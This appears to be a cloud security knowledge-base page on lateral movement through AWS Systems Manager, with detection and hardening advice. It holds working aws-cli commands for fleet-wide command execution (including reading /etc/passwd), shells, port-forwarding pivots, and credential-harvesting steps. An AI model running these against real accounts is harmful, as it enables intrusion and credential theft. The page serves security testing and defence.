---
cstg_id: CSTG-AWS-SSM-LATERAL
title: "AWS Ssm - Lateral Movement"
provider: aws
service: ssm
phase: lateral-movement
required_access: assumed-breach
required_permissions:
  - ssm:DescribeInstanceInformation
  - ssm:SendCommand
  - ssm:StartSession
  - ssm:GetConnectionStatus
  - ssm:DescribeSessions
  - ssm:GetParametersByPath
  - ec2:DescribeInstances
tools:
  - aws-cli
  - session-manager-plugin
  - boto3
references:
  - "https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html"
  - "https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-port-forwarding.html"
  - "https://docs.aws.amazon.com/systems-manager/latest/userguide/run-command.html"
  - "https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/"
license: CC BY-SA 4.0
---

## Summary

Systems Manager is a near-ideal lateral-movement channel because it moves between hosts entirely over the AWS control plane: no inbound security-group rules, no SSH/RDP exposure, no bastion, and no network reachability between the source and target are required. Any principal with `ssm:SendCommand` or `ssm:StartSession` against a managed node can execute code on it, open an interactive shell, or - via Session Manager port forwarding - tunnel to services on or behind that node. SSM thus lets an attacker pivot across an entire managed fleet, including into private subnets and hybrid/on-premises machines, from a single set of AWS credentials.

This page covers moving from one foothold to other hosts using SSM. The attacker objective is to reach additional instances, private services, and adjacent networks by leveraging SSM execution and tunneling rather than traditional network paths.

## Prerequisites

- An assumed-breach AWS identity (IAM user/role/STS session) with `ssm:SendCommand` and/or `ssm:StartSession` on one or more managed nodes.
- The Session Manager plugin installed locally for interactive sessions and port forwarding.
- Target nodes must be Online managed nodes (SSM agent running and reporting). Confirm via [Enumeration](../02-services/aws-ssm-enum.md).
- For port forwarding to remote hosts (`AWS-StartPortForwardingSessionToRemoteHost`), the target node must have network reachability to the downstream host.

## Enumeration

```bash
# Inventory reachable nodes and their platform (choose Linux vs Windows payloads)
aws ssm describe-instance-information --filters "Key=PingStatus,Values=Online" \
  --query 'InstanceInformationList[].{Id:InstanceId,Platform:PlatformType,IP:IPAddress,Name:ComputerName}'

# Confirm a specific target is connectable
aws ssm get-connection-status --target i-0123456789abcdef0

# Map subnets/VPCs to plan reachability into private segments
aws ec2 describe-instances \
  --query 'Reservations[].Instances[].{Id:InstanceId,Subnet:SubnetId,Priv:PrivateIpAddress,VPC:VpcId}'
```

## Misconfigurations & Findings

- **Fleet-wide `ssm:SendCommand`/`StartSession` (`Resource: *`).** A single compromised identity can execute on every managed node, collapsing network segmentation.
- **No tag/condition scoping on SSM execution.** Without `ssm:resourceTag` conditions, production and sensitive nodes are reachable from any operational identity.
- **Port forwarding unrestricted.** `AWS-StartPortForwardingSession` and `...ToRemoteHost` allow tunneling to internal databases, admin panels, and other hosts the instance can reach - effectively a managed-plane VPN into private subnets.
- **Hybrid/on-prem managed nodes.** SSM reaches `mi-*` nodes outside AWS, providing a pivot from the cloud into a corporate network.
- **Shared/static credentials surfaced on a host** that are valid on neighboring hosts (re-used SSH keys, service-account passwords in files), enabling chained movement.

## Exploitation

### Execute on additional hosts via Run Command

`SendCommand` can target many instances at once by ID, tag, or resource group, executing the same payload fleet-wide:

```bash
# Move to several specific instances
aws ssm send-command --document-name "AWS-RunShellScript" \
  --instance-ids i-aaa i-bbb i-ccc \
  --parameters 'commands=["hostname; whoami; cat /etc/passwd"]'

# Move to everything carrying a tag (e.g., all app servers)
aws ssm send-command --document-name "AWS-RunShellScript" \
  --targets "Key=tag:Role,Values=app" \
  --parameters 'commands=["id"]'
```

Windows targets use `AWS-RunPowerShellScript`. Output is retrieved with `get-command-invocation`.

### Interactive shell on a target

```bash
aws ssm start-session --target i-0123456789abcdef0
# Lands as ssm-user with sudo; explore the host, harvest local credentials, stage further movement
```

### Port forwarding to pivot into private services

Forward a local port to a port on the managed node itself (e.g., a local admin service bound to localhost):

```bash
aws ssm start-session --target i-0123456789abcdef0 \
  --document-name AWS-StartPortForwardingSession \
  --parameters '{"portNumber":["8080"],"localPortNumber":["9999"]}'
```

Forward through the node to a *remote* host it can reach - for example, a private RDS database or an internal admin interface in the same VPC:

```bash
aws ssm start-session --target i-0123456789abcdef0 \
  --document-name AWS-StartPortForwardingSessionToRemoteHost \
  --parameters '{"host":["db.internal.example"],"portNumber":["5432"],"localPortNumber":["15432"]}'
# Then connect locally: psql -h 127.0.0.1 -p 15432 ...
```

This turns any reachable managed node into a tunnel endpoint, exposing internal services without touching network ACLs or security groups inbound.

### Harvest credentials for the next hop

On each reached host, collect material that enables further lateral movement: instance-profile credentials from IMDS, SSH private keys, `~/.aws/credentials`, application config with database/service passwords, and SSM Parameter Store values the host can read. Re-used credentials commonly unlock adjacent hosts directly.

### Pivot into hybrid / on-premises

Hybrid-activated nodes (`mi-*`) accept the same `SendCommand`/`StartSession`, providing execution on machines outside AWS:

```bash
aws ssm send-command --document-name "AWS-RunShellScript" \
  --targets "Key=InstanceIds,Values=mi-0123456789abcdef0" \
  --parameters 'commands=["ip a; cat /etc/resolv.conf"]'
```

## Detection & Logging

- **CloudTrail** records `SendCommand`, `StartSession`, `GetConnectionStatus`, and `TerminateSession`, including the calling principal, the target instance IDs/targets, and the document used. Fleet-wide targeting (`Targets` with broad tags or many IDs) is visible here.
- Session Manager logging (S3/CloudWatch, ideally KMS-encrypted) captures interactive session commands and port-forwarding setup; enable it to see what moved laterally.
- The instance's own SSM agent logs (`/var/log/amazon/ssm/`) and OS audit logs record executed commands and session activity on the host.
- Indicators: a single principal issuing `SendCommand`/`StartSession` to many distinct instances in a short window; `AWS-StartPortForwardingSessionToRemoteHost` to database/admin ports; and GuardDuty findings for instance-credential use off-host or anomalous network behavior originating from a forwarded session.

## Remediation & Hardening

- Scope `ssm:SendCommand` and `ssm:StartSession` with `Resource` ARNs and `ssm:resourceTag`/`aws:ResourceTag` conditions so each operational role reaches only its own fleet segment.
- Restrict or deny the port-forwarding session documents (`AWS-StartPortForwardingSession`, `AWS-StartPortForwardingSessionToRemoteHost`) for roles that should not tunnel.
- Enforce Session Manager logging to S3/CloudWatch with encryption and turn on session activity auditing; require run-as and idle-timeout controls.
- Apply network segmentation defense-in-depth even with SSM: keep sensitive databases on hosts that fewer managed nodes can reach, and use security groups to limit instance-to-instance traffic.
- Limit and expire hybrid activations; treat on-prem managed nodes as high-value and monitor their SSM activity closely.
- Enforce IMDVv2 with a hop limit of 1, rotate/scope local credentials, and avoid credential re-use across hosts to break credential-based chaining.

## Tools

- **aws-cli** - `send-command`, `start-session`, and port-forwarding session documents.
- **session-manager-plugin** - required client component for interactive sessions and tunnels.
- **boto3 / cloud SDKs** - scripted fan-out execution and tunnel orchestration across many nodes.

## References

- AWS Session Manager documentation - https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html
- AWS Session Manager port forwarding - https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-port-forwarding.html
- AWS Run Command documentation - https://docs.aws.amazon.com/systems-manager/latest/userguide/run-command.html
- Hacking the Cloud - Run shell commands on EC2 - https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/
